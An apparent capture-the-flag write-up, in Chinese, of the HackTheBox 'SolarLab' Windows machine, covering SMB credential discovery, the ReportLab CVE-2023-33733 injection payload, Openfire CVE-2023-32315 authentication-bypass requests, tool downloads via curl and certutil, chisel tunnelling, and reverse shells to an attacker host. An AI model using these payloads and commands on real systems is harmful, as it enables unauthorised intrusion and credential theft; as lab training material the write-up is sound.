@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="SMB共享文件获取敏感信息、Python Reportlab 代码注入漏洞、Openfire身份认证绕过漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SolarLab">
+<meta property="og:url" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="SMB共享文件获取敏感信息、Python Reportlab 代码注入漏洞、Openfire身份认证绕过漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602104226917.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602114836534.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602114912532.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602200358108.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602202614214.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602202809085.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602203427577.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602204812175.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602205810553.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602213138305.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602214407604.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602215037905.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602215156989.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602215809073.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602220318246.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602220512260.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602224001586.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602224737039.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602225153411.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602225847251.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602231518952.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602231610637.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602231639866.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602232939862.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240603000137332.png">
+<meta property="article:published_time" content="2024-06-02T02:38:32.000Z">
+<meta property="article:modified_time" content="2024-09-01T14:41:40.441Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/SolarLab-HackTheBox/image-20240602104226917.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/SolarLab-HackTheBox.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SolarLab | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/SolarLab-HackTheBox.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SolarLab
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-06-02 10:38:32" itemprop="dateCreated datePublished" datetime="2024-06-02T10:38:32+08:00">2024-06-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-09-01 22:41:40" itemprop="dateModified" datetime="2024-09-01T22:41:40+08:00">2024-09-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/SolarLab-HackTheBox.html" class="post-meta-item leancloud_visitors" data-flag-title="SolarLab" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/SolarLab-HackTheBox.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/SolarLab-HackTheBox.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>SMB共享文件获取敏感信息、Python Reportlab 代码注入漏洞、Openfire身份认证绕过漏洞</p>
+<span id="more"></span>
+
+<h1 id="SolarLab"><a href="#SolarLab" class="headerlink" title="SolarLab"></a>SolarLab</h1><p><strong>信息搜集</strong></p>
+<p>nmap扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.16</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          nginx 1.24.0</span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds?</span><br></pre></td></tr></table></figure>
+
+<p>观察到445端口开放存在Microsoft-DS服务，用smb查看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.11.16</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/SolarLab-HackTheBox/image-20240602104226917.png"></p>
+<p>用Documents登录一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.11.16\\Documents</span><br></pre></td></tr></table></figure>
+
+<p>我们注意到有个xlsx表格文件，使用get命令下载下来</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602114836534.png"></p>
+<p>打开看看发现有用户信息，应该能利用登录</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602114912532.png"></p>
+<p>访问80端口发现跳转域名，添加到hosts文件即可</p>
+<p>不过在扫描子域名以及目录后没有收获，尝试重新使用nmap扫描全部端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">80/tcp   open  http          nginx 1.24.0</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">6791/tcp open  http          nginx 1.24.0</span><br></pre></td></tr></table></figure>
+
+<p>还存在6791端口，访问发现跳转直接添加hosts文件即可</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602200358108.png"></p>
+<p>回到刚刚得到的用户信息，初步测试发现只有用户名为<code>AlexanderK</code>和<code>ClaudiaS</code>存在，并且使用密码登陆不成功</p>
+<p>但是我们注意到表格左上方有三个用户，其中<code>Blake</code>引起我们注意。并且用户登录的用户名的尾部是大写字母，我们尝试对其爆破出用户<code>Blake</code>的登录username</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602202614214.png"></p>
+<p>成功登录</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602202809085.png"></p>
+<p>大概翻了一下是和生成pdf文件有关，搜索一下ReportHub</p>
+<p>得知reportlab是一个用于生成PDF和图形的Python库，并且存在Python Reportlab 代码注入漏洞(CVE-2023-33733)</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602203427577.png"></p>
+<p>github上有写好的poc <a target="_blank" rel="noopener" href="https://github.com/c53elyas/CVE-2023-33733/blob/master/code-injection-poc/poc.py">脚本链接</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;para&gt;</span><br><span class="line">              &lt;font color=&quot;[ [ getattr(pow,Word(&#x27;__globals__&#x27;))[&#x27;os&#x27;].system(&#x27;whoami&#x27;) for Word in [orgTypeFun(&#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1, &#x27;startswith&#x27;: lambda self, x: False, &#x27;__eq__&#x27;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123;setattr(self, &#x27;mutated&#x27;, self.mutated - 1)&#125;, &#x27;__hash__&#x27;: lambda self: hash(str(self)) &#125;)] ] for orgTypeFun in [type(type(1))] ] and &#x27;red&#x27;&quot;&gt;</span><br><span class="line">                exploit</span><br><span class="line">                &lt;/font&gt;</span><br><span class="line">            &lt;/para&gt;</span><br></pre></td></tr></table></figure>
+
+<p>修改一下脚本中执行的命令为反弹shell，测试发现是windows系统，用在线网站生成powershell版本的shell <a target="_blank" rel="noopener" href="https://zgao.top/reverse-shell/">网站链接</a></p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602204812175.png"></p>
+<p>随便选个request请求，抓包添加payload到<code>training_request</code>参数</p>
+<p>成功反弹shell</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602205810553.png"></p>
+<p>在<code>C:\Users\blake\Desktop</code>找到user的flag</p>
+<p>大概翻了一下没有什么可以利用的，我们查看下连接的端口情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+
+<p>与常见端口漏洞利用对比，发现存在9090端口</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602213138305.png"></p>
+<p>我们利用chisel进行端口转发，把9090端口转发到我们本机</p>
+<p>（注意这里传的是windows版本的chisel，并且要用curl不知道wget为什么不行）</p>
+<p>在本地开启http服务，用curl去传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.14.88/chisel.exe -o chisel.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/SolarLab-HackTheBox/image-20240602214407604.png"></p>
+<p>进行隧道搭建</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机：./chisel server -p 6150 --reverse</span><br><span class="line">靶机：./chisel.exe client 10.10.14.88:6150 R:9090:127.0.0.1:9090  #R表示反向隧道</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>127.0.0.1:9090</code>，发现是版本为4.7.4的openfire</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602215037905.png"></p>
+<p>去阿里云漏洞库搜一下，找到Openfire身份认证绕过漏洞(CVE-2023-32315)</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602215156989.png"></p>
+<p>我们验证一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp</span><br></pre></td></tr></table></figure>
+
+<p>成功访问日志</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602215809073.png"></p>
+<p>我们思路就是<strong>未授权</strong>创建管理员用户 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/675189543">参考文章</a></p>
+<p>首先获取<code>JSESSIONID</code>和<code>csrf</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/SolarLab-HackTheBox/image-20240602220318246.png"></p>
+<p>使用获取到<code>JSESSIONID</code>和<code>csrf</code>创建用户<code>re1v1ve/rev1ve</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=SM0rG58cmPWkkiR&amp;username=rev1ve&amp;name=&amp;email=&amp;password=rev1ve&amp;passwordConfirm=admin123&amp;isadmin=on&amp;create=Create+User HTTP/1.1</span><br><span class="line">Host: x.x.x.x:9090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Cookie: JSESSIONID=node015oa6y9775tb54z36d9l36h8b7.node0;csrf=hXgFWkHO1HyB6Rb</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/SolarLab-HackTheBox/image-20240602220512260.png"></p>
+<p>不过抛出异常了，还可以用github上的工具创建</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd CVE-2023-32315-Openfire-Bypass/scan_all</span><br><span class="line">go mod tidy</span><br><span class="line">go run main.go -u http://10.10.14.88:9090</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/SolarLab-HackTheBox/image-20240602224001586.png"></p>
+<p>成功登录</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602224737039.png"></p>
+<p>上传插件 <a target="_blank" rel="noopener" href="https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/tag/v0.1">插件链接</a></p>
+<p>在<code>server =&gt; server settings</code>功能处发现发现<code>shell Plugins</code></p>
+<p>按照上传插件的描述<code>pass 123</code>用密码123登录，找到命令执行界面</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602225153411.png"></p>
+<p>还是用powershell去弹shell</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602225847251.png"></p>
+<p>在<code>C:\Program Files\Openfire\embedded-db</code>发现<code>openfire.script</code>文件</p>
+<p>查看一下，发现插入的和admin有关数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO OFUSER VALUES(&#x27;admin&#x27;,&#x27;gjMoswpK+HakPdvLIvp6eLKlYh0=&#x27;,&#x27;9MwNQcJ9bF4YeyZDdns5gvXp620=&#x27;,&#x27;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#x27;,4096,NULL,&#x27;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#x27;,&#x27;Administrator&#x27;,&#x27;admin@solarlab.htb&#x27;,&#x27;001700223740785&#x27;,&#x27;0&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>再看下对应表的键名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))</span><br></pre></td></tr></table></figure>
+
+<p>发现第7列对应的键值可能是凭证之类的，用github上的openfire工具后台管理密码解密 <a target="_blank" rel="noopener" href="https://github.com/c0rdis/openfire_decrypt?tab=readme-ov-file">工具链接</a></p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602231518952.png"></p>
+<p>出现报错缺少passwordKey，往下翻翻找到</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602231610637.png"></p>
+<p>跑出来密码后，那么就可以切换administrator用户</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602231639866.png"></p>
+<p>上传一下RunasCs用来用户切换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.88/RunasCs.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/SolarLab-HackTheBox/image-20240602232939862.png"></p>
+<p>用powershell弹到本地1234端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./RunasCs.exe administrator ThisPasswordShouldDo!@ powershell.exe -r 10.10.14.88:1234</span><br></pre></td></tr></table></figure>
+
+<p>成功切换administrator用户拿到root的flag</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240603000137332.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
+              <a href="/tags/Windows/" rel="tag"># Windows</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/BoardLight-HackTheBox.html" rel="prev" title="BoardLight">
+      <i class="fa fa-chevron-left"></i> BoardLight
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA.html" rel="next" title="CISCN2024 华东南赛区">
+      CISCN2024 华东南赛区 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SolarLab"><span class="nav-number">1.</span> <span class="nav-text">SolarLab</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
